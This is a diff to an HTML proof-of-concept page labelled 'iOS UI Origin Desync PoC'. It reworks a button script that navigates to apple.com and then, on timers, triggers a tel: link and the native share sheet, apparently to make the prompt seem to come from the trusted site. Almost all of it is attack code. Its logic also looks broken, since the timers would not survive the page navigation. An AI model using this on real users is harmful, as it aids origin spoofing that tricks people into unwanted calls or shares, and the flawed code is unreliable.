@@ -2,20 +2,21 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>iOS tel: Origin Desync PoC</title>
+<title>iOS UI Origin Desync PoC</title>
 
 <style>
 body {
   font-family:-apple-system,system-ui;
+  background:#111;
+  color:#fff;
   height:100vh;
   display:flex;
   align-items:center;
   justify-content:center;
-  background:#f5f5f7;
 }
 button {
-  font-size:20px;
-  padding:14px 24px;
+  font-size:22px;
+  padding:14px 28px;
   border:none;
   border-radius:12px;
   background:#007aff;
@@ -26,26 +27,40 @@ button {
 
 <body>
 
-<button id="go">Start</button>
+<button id="start">START</button>
 
 <script>
-let w;
+let interacted = false;
 
-document.getElementById('go').onclick = () => {
+// detect interaction AFTER navigation
+['click','scroll','touchstart'].forEach(e =>
+  addEventListener(e, () => interacted = true, { once:true })
+);
 
-  // 1️⃣ Open trusted-looking page in new window
-  w = window.open("https://apple.com", "_blank");
+document.getElementById("start").onclick = async () => {
 
-  // 2️⃣ Store activation state
-  history.pushState({}, "", "/trusted");
+  // 1️⃣ Navigate to trusted-looking page
+  location.href = "https://apple.com";
 
-  // 3️⃣ Wait until user interacts on new page
+  // 2️⃣ After navigation + user interaction → TEL
   setTimeout(() => {
-    try {
-      // 🔥 External protocol AFTER navigation
-      w.location = "tel:123456";
-    } catch(e){}
+    if (interacted) {
+      location.href = "tel:1234";
+    }
   }, 6000);
+
+  // 3️⃣ Share UI race (optional but strong)
+  if (navigator.share) {
+    setTimeout(async () => {
+      try {
+        await navigator.share({
+          title: "Test",
+          text: "Origin confusion test",
+          url: "https://example.com"
+        });
+      } catch {}
+    }, 3000);
+  }
 };
 </script>
 
